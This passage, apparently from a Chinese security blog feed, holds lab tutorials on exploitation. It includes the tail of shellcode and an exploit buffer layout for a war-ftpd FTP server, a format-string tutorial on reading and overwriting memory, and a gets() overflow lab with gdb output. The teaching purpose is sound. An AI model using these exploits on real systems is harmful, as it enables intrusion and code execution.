class="string">&quot;\xb9\xa0\x45\x03\x34\xb8\x82\xa4\xa7\xcf\xf8\xd6\x5a\xc8&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x3b\xa4\x80\x5d\xd9\x0e\x42\xc5\x39\xae\x87\x90\xca\xbc&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x6c\xd6\x94\xa0\x73\x3b\xaf\xdd\xf8\xba\x7f\x54\xba\x98&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x5b\x3c\x18\x80\xfa\x98\xcf\xbd\x1c\x44\xaf\x1b\x57\x67&quot;</span> +</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xa4\x1a\x3a\xe2\x3b\xae\x41\x4b\x3b\xb0\x49\xfc\x54\x81&quot;</span> +</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xc2\x93\x23\x1e\x01\xd0\xdc\x54\x0b\x71\x75\x31\xde\xc3&quot;</span> +</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x18\xc2\x35\x07\x25\x41\xbf\xf8\xd2\x59\xca\xfd\x9f\xdd&quot;</span> +</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x27\x8c\xb0\x8b\x47\x23\xb0\x99\x24\xae\x2a\x02\x85\x5b&quot;</span> +</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x93\x21\xb8\xf7\xb0\xa5&quot;</span></span><br></pre></td></tr></table></figure><p>在shellcode前添加了10个NOP，使之更好执行流程到它的最终目标。</p><p>pattern &#x3D; “\x41”485 + “\x7B\x46\x86\x7C” + “\x42”4 + “\x90”10”+ shellcode \xCC”*267 (497-230(shellcode长度))</p><p>将构造好的EXP发送给开放21端口且运行war-ftpd的XP本机：</p><h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="背景-2"><a href="#背景-2" class="headerlink" title="背景"></a>背景</h2><p>格式化字符串漏洞是一个很古老的漏洞了，现在几乎已经见不到这类漏洞的身影，但是作为漏洞分析的初学者来说，还是很有必要研究一下的。</p><p>格式化字符串漏洞是由像printf(user_input)这样的代码引起的，其中user_input是用户输入的数据，具有Set-UID root权限的这类程序在运行的时候，printf语句将会变得非常危险，因为它可能会导致下面的结果：</p><p>1.使得程序崩溃</p><p>2.任意一块内存读取数据</p><p>3.修改任意一块内存里的数据</p><p>最后一种结果是非常危险的，因为它允许用户修改set-UID root程序内部变量的值，从而改变这些程序的行为。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> (<span class="string">&quot;The magic number is: %d&quot;</span>, <span class="number">1911</span>);</span><br></pre></td></tr></table></figure><p>试观察运行以上语句，会发现字符串”The magic number is: %d”中的格式符％d被参数（1911）替换，因此输出变成了“The magic number is: 1911”。 </p><p>格式化函数的行为由格式化字符串控制，printf函数从栈上取得参数。</p><p><img src="/.io//image-20240208161506399.png" alt="image-20240208161506399"></p><p><strong>如果参数数量不匹配会发生什么？</strong></p><p>如果只有一个不匹配会发生什么？</p><p>printf (“a has value %d, b has value %d, c is at address: %08x\n”,a, b);</p><p>1，在上面的例子中格式字符串需要3个参数，但程序只提供了2个。</p><p>2，该程序能够通过编译么？</p><p>⑴printf()是一个参数长度可变函数。因此，仅仅看参数数量是看不出问题的。</p><p>⑵为了查出不匹配，编译器需要了解printf()的运行机制，然而编译器通常不做这类分析。</p><p>⑶有些时候，格式字符串并不是一个常量字符串，它在程序运行期间生成(比如用户输入)，因此，编译器无法发现不匹配。</p><p>3，那么printf()函数自身能检测到不匹配么？</p><p>⑴printf()从栈上取得参数，如果格式字符串需要3个参数，它会从栈上取3个，除非栈被标记了边界，printf()并不知道自己是否会用完提供的所有参数。</p><p>⑵既然没有那样的边界标记。printf()会持续从栈上抓取数据，在一个参数数量不匹配的例子中，它会抓取到一些不属于该函数调用到的数据。</p><p>4，如果有人特意准备数据让printf抓取会发生什么呢？</p><p><strong>访问任意位置内存</strong></p><p>1，我们需要得到一段数据的内存地址，但我们无法修改代码，供我们使用的只有格式字符串。</p><p>2，如果我们调用 printf(%s) 时没有指明内存地址, 那么目标地址就可以通过printf函数，在栈上的任意位置获取。printf函数维护一个初始栈指针,所以能够得到所有参数在栈中的位置</p><p>3，观察: 格式字符串位于栈上. 如果我们可以把目标地址编码进格式字符串，那样目标地址也会存在于栈上，在接下来的例子里，格式字符串将保存在栈上的缓冲区中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> user_input[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    ... ... <span class="comment">/* other variable definitions and statements */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, user_input); <span class="comment">/* getting a string from user */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(user_input); <span class="comment">/* Vulnerable place */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>4，如果我们让printf函数得到格式字符串中的目标内存地址 (该地址也存在于栈上), 我们就可以访问该地址.</p><p>printf (“\x10\x01\x48\x08 %x %x %x %x %s”);</p><p>5，\x10\x01\x48\x08 是目标地址的四个字节， 在C语言中, \x10 告诉编译器将一个16进制数0×10放于当前位置（占1字节）。如果去掉前缀\x10就相当于两个ascii字符1和0了，这就不是我们所期望的结果了。</p><p>6，%x 导致栈指针向格式字符串的方向移动</p><p>7，下图解释了攻击方式，如果用户输入中包含了以下格式字符串 </p><p><img src="/.io//image-20240208161732206.png" alt="image-20240208161732206"></p><p>如图所示，我们使用四个%x来移动printf函数的栈指针到我们存储格式字符串的位置，一旦到了目标位置，我们使用％s来打印，它会打印位于地址0×10014808的内容，因为是将其作为字符串来处理，所以会一直打印到结束符为止。</p><p>user_input数组到传给printf函数参数的地址之间的栈空间不是为了printf函数准备的。但是，因为程序本身存在格式字符串漏洞，所以printf会把这段内存当作传入的参数来匹配％x。</p><p>最大的挑战就是想方设法找出printf函数栈指针(函数取参地址)到user_input数组的这一段距离是多少，这段距离决定了你需要在%s之前输入多少个%x。</p><p><strong>在内存中写一个数字</strong></p><p>%n: 该符号前输入的字符数量会被存储到对应的参数中去</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> (<span class="string">&quot;12345%n&quot;</span>, &amp;i);</span><br></pre></td></tr></table></figure><p>1，数字5（%n前的字符数量）将会被写入i 中</p><p>2，运用同样的方法在访问任意地址内存的时候，我们可以将一个数字写入指定的内存中。只要将%s替换成%n就能够覆盖0×10014808的内容。</p><p>3，利用这个方法，攻击者可以做以下事情:</p><p>重写程序标识控制访问权限</p><p>重写栈或者函数等等的返回地址</p><p>4，然而，写入的值是由%n之前的字符数量决定的。真的有办法能够写入任意数值么？</p><p>用最古老的计数方式， 为了写1000，就填充1000个字符吧。</p><p>为了防止过长的格式字符串，我们可以使用一个宽度指定的格式指示器。(比如（%0数字x）就会左填充预期数量的0符号)</p><h2 id="利用格式化字符串漏洞"><a href="#利用格式化字符串漏洞" class="headerlink" title="利用格式化字符串漏洞"></a>利用格式化字符串漏洞</h2><p>用户需要输入一段数据，数据保存在user_input数组中，程序会使用printf函数打印数据内容，并且该程序以root权限运行。这个程序存在一个格式化漏洞。</p><p>程序内存中存在两个秘密值，我们想要知道这两个值，但发现无法通过读二进制代码的方式来获取它们（实验中为了简单起见，硬编码这些秘密值为0x44和0x55）。尽管我们不知道它们的值，但要得到它们的内存地址倒不是特别困难，因为对大多数系统而言，每次运行程序，这些内存地址基本上是不变的。实验假设我们已经知道了这些内存地址，为了达到这个目的，程序特意为我们打出了这些地址。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* vul_prog.c */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> SECRET1 0x44</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> SECRET2 0x55</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="type">char</span> user_input[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">      <span class="type">int</span> *secret;</span><br><span class="line"></span><br><span class="line">      <span class="type">long</span> int_input;</span><br><span class="line"></span><br><span class="line">      <span class="type">int</span> a, b, c, d; <span class="comment">/* other variables, not used here.*/</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The secret value is stored on the heap */</span></span><br><span class="line"></span><br><span class="line">      secret = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* getting the secret */</span></span><br><span class="line"></span><br><span class="line">      secret[<span class="number">0</span>] = SECRET1; secret[<span class="number">1</span>] = SECRET2;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;The variable secret&#x27;s address is 0x%8x (on stack)\n&quot;</span>, &amp;secret);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;The variable secret&#x27;s value is 0x%8x (on heap)\n&quot;</span>, secret);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;secret[0]&#x27;s address is 0x%8x (on heap)\n&quot;</span>, &amp;secret[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;secret[1]&#x27;s address is 0x%8x (on heap)\n&quot;</span>, &amp;secret[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter a decimal integer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;int_input);  <span class="comment">/* getting an input from user */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter a string\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, user_input); <span class="comment">/* getting a string from user */</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Vulnerable place */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(user_input); </span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Verify whether your attack is successful */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;The original secrets: 0x%x -- 0x%x\n&quot;</span>, SECRET1, SECRET2);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;The new secrets:      0x%x -- 0x%x\n&quot;</span>, secret[<span class="number">0</span>], secret[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实验环境是64位系统，所以需要使用%016llx才能读取整个字。</p><p><strong>找出secret[0]的值</strong></p><p>1.首先定位int_input的位置，这样就确认了％s在格式字符串中的位置。</p><p><img src="/.io//image-20240208163758538.png" alt="image-20240208163758538"></p><p>2.输入secret[0]的地址，记得做进制转换(22003732)，同时在格式字符串中加入％s。</p><p><img src="/.io//image-20240208163850544.png" alt="image-20240208163850544"></p><p>获取到D–0x44。</p><p>3.修改为任意值</p><p><img src="/.io//image-20240208164657715.png" alt="image-20240208164657715"></p><p>其中，%.880u限定了字符零填充到880个大小，%n往目标地址写入在此之前的字符数量</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;缓冲区溢出漏洞实战记录&quot;&gt;&lt;a href=&quot;#缓冲区溢出漏洞实战记录&quot; class=&quot;headerlink&quot; title=&quot;缓冲区溢出漏洞实战记录&quot;&gt;&lt;/a&gt;缓冲区溢出漏洞实战记录&lt;/h1&gt;&lt;h1 id=&quot;脚本&quot;&gt;&lt;a href=&quot;#脚本&quot; class=&quot;head</summary>
      
    
    
    
    <category term="PWN" scheme="https://qianmuoy.github.io/categories/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN实战</title>
    <link href="https://qianmuoy.github.io/2024/03/09/PWN%E5%AE%9E%E6%88%98/"/>
    <id>https://qianmuoy.github.io/2024/03/09/PWN%E5%AE%9E%E6%88%98/</id>
    <published>2024-03-09T12:33:11.000Z</published>
    <updated>2024-03-09T12:33:26.126Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h1 id="一般溢出"><a href="#一般溢出" class="headerlink" title="一般溢出"></a>一般溢出</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>主机&#x2F;home&#x2F;test&#x2F;1目录下有一个pwn1程序，执行这个程序的时候可以输入数据进行测试，pwn1程序会输出Please try again.的提示信息，请对pwn1程序进行逆向分析和调试，找到程序内部的漏洞，并构造特殊的输入数据，使之输出Congratulations, you pwned it.信息。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> modified;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    modified = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">gets</span>(buffer);        <span class="comment">// 引发缓冲区溢出</span></span><br><span class="line">    <span class="keyword">if</span> (modified != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulations, you pwned it.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please try again.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用gets函数读取输入数据时，并不会对buffer缓冲区的长度进行检查，输入超长的输入数据时会引发缓冲区溢出。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>gdb调试器</p><p><img src="/.io//image-20240208170500645.png" alt="image-20240208170500645"></p><p>执行gdb pwn1即可开始通过gdb对pwn1进行调试，现在我们需要阅读main函数的汇编代码，在gdb中执行disas main命令即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb pwn1</span><br><span class="line">disas main</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208174004328.png" alt="image-20240208174004328"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">0x080482a0 &lt;+0&gt;:   push   %ebp</span><br><span class="line"></span><br><span class="line">0x080482a1 &lt;+1&gt;:   mov    %esp,%ebp</span><br><span class="line"></span><br><span class="line">0x080482a3 &lt;+3&gt;:   and    $0xfffffff0,%esp</span><br><span class="line"></span><br><span class="line">; esp = esp - 0x60，即在栈上分配0x60）字节的空间</span><br><span class="line"></span><br><span class="line">0x080482a6 &lt;+6&gt;:   sub    $0x60,%esp</span><br><span class="line"></span><br><span class="line">; modified变量位于esp + 0x5C处，将其初始化为0</span><br><span class="line"></span><br><span class="line">0x080482a9 &lt;+9&gt;:   movl   $0x0,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">; buffer位于esp + 0x1C处</span><br><span class="line"></span><br><span class="line">0x080482b1 &lt;+17&gt;:  lea    0x1c(%esp),%eax</span><br><span class="line"></span><br><span class="line">0x080482b5 &lt;+21&gt;:  mov    %eax,(%esp)</span><br><span class="line"></span><br><span class="line">; 调用gets(buffer)读取输入数据</span><br><span class="line"></span><br><span class="line">0x080482b8 &lt;+24&gt;:  call   0x8049360 &lt;gets&gt;</span><br><span class="line"></span><br><span class="line">; 判断modified变量的值是否是0</span><br><span class="line"></span><br><span class="line">0x080482bd &lt;+29&gt;:  cmpl   $0x0,0x5c(%esp)</span><br><span class="line"></span><br><span class="line">; 如果modified的值等于0，就跳转到 0x080482d2</span><br><span class="line"></span><br><span class="line">0x080482c2 &lt;+34&gt;:  je     0x80482d2 &lt;main+50&gt;</span><br><span class="line"></span><br><span class="line">; modified不为0，打印成功提示</span><br><span class="line"></span><br><span class="line">0x080482c4 &lt;+36&gt;:  movl   $0x80b3eec,(%esp)</span><br><span class="line"></span><br><span class="line">0x080482cb &lt;+43&gt;:  call   0x8049500 &lt;puts&gt;</span><br><span class="line"></span><br><span class="line">0x080482d0 &lt;+48&gt;:  jmp    0x80482de &lt;main+62&gt;</span><br><span class="line"></span><br><span class="line">; modified为0，打印失败提示</span><br><span class="line"></span><br><span class="line">0x080482d2 &lt;+50&gt;:  movl   $0x80b3f0b,(%esp)</span><br><span class="line"></span><br><span class="line">0x080482d9 &lt;+57&gt;:  call   0x8049500 &lt;puts&gt;</span><br><span class="line"></span><br><span class="line">0x080482de &lt;+62&gt;:  mov    $0x0,%eax</span><br><span class="line"></span><br><span class="line">0x080482e3 &lt;+67&gt;:  leave</span><br><span class="line"></span><br><span class="line">0x080482e4 &lt;+68&gt;:  ret</span><br></pre></td></tr></table></figure><p>通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x1C处，而modified位于esp+0x5C处，两个地址的距离为0x5C - 0x1C &#x3D; 0x40，即64，刚好为buffer数组的大小。因此当我们输入的数据超过64字节时，modified变量就可以被覆盖。</p><p>下面在gdb中进行验证，在gdb中执行b *0x080482bd命令对gets的下一条指令下一个断点，执行r命令，让被调试的pwn1程序跑起来，就可以输入数据进行测试了，这里我们输入64个A以及1个B（即 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB），按下 Enter键程序就在断点处断下了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *0x080482bd</span><br><span class="line">r</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208174346300.png" alt="image-20240208174346300"></p><p>在gdb中输入x $esp+0x5C，查看modified变量的值已经被修改成了0x00000042，而0x42就是字符’B’的ASCII值，表明我们成功用输入数据的第65个字节覆盖了modified变量：</p><p>在gdb中连续多次执行ni命令，可以看到je指令没有跳转，说明modified的值不为0，程序进入输出通过信息的if语句分支：</p><p><img src="/.io//image-20240208174609847.png" alt="image-20240208174609847"></p><p>使用c命令让程序执行下去。</p><p>下面我们就可以通过构造输入数据进行攻击了。输入q命令就可以退出gdb，ctrl+L清空当前命令窗口。</p><p>通过python语句构造输入数据，然后通过管道传给pwn1程序，执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;A&#x27;*64+&#x27;B&#x27;&quot;</span> | ./pwn1</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208174843897.png" alt="image-20240208174843897"></p><p>成功通过。</p><h1 id="精确覆盖变量数据"><a href="#精确覆盖变量数据" class="headerlink" title="精确覆盖变量数据"></a>精确覆盖变量数据</h1><h2 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h2><p>  C语言的main函数拥有两个参数，为int类型的argc参数，以及char**类型argv参数。其中argc参数的值表示命令行参数的个数，而argv则指向一个字符串数组，该数组存储了具体的命令行参数的内容。注意程序本身的名字为命令行的第一个参数。</p><p>   打印命令行参数信息的示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; ++i)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;argv[%d] = %s\n&quot;</span>, i, argv[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译这段代码生成test程序，然后在命令行下执行，尝试传入命令行参数，如：.&#x2F;test hello world cmdline，可以看到程序打印出具体的命令行参数信息。</p><p><img src="/.io//image-20240208203000662.png" alt="image-20240208203000662"></p><p>Linux的<strong>xargs</strong>命令可以将输入数据当做命令行参数传给指定的程序。比如执行命令python -c “print ‘AAA BBB CCC’” | xargs .&#x2F;test后，输出：</p><p><img src="/.io//image-20240208202932277.png" alt="image-20240208202932277"></p><p> python语句执行后输出AAA BBB CCC，通过管道操作作为xargs命令的输入，而xargs将其作为test程序的命令行参数，因此test程序会把这些信息打印出来。</p><p>小端序</p><p><img src="/.io//image-20240208203105302.png" alt="image-20240208203105302"></p><p>主机&#x2F;home&#x2F;test&#x2F;2目录下有一个pwn2程序，这个程序会对传入的命令行参数进行处理，通过构造特定的命令行参数数据可以对程序发起溢出攻击，成功会提示Congratulations, you pwned it.，失败则会提示Please try again.的提示信息。</p><h2 id="利用缓冲区溢出改写变量的值"><a href="#利用缓冲区溢出改写变量的值" class="headerlink" title="利用缓冲区溢出改写变量的值"></a>利用缓冲区溢出改写变量的值</h2><p>执行gdb pwn2即可开始通过gdb对pwn2进行调试，现在我们需要阅读main函数的汇编代码，在gdb中执行disas main命令：</p><p><img src="/.io//image-20240208203619828.png" alt="image-20240208203619828"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">0x080482a0 &lt;+0&gt;:    push   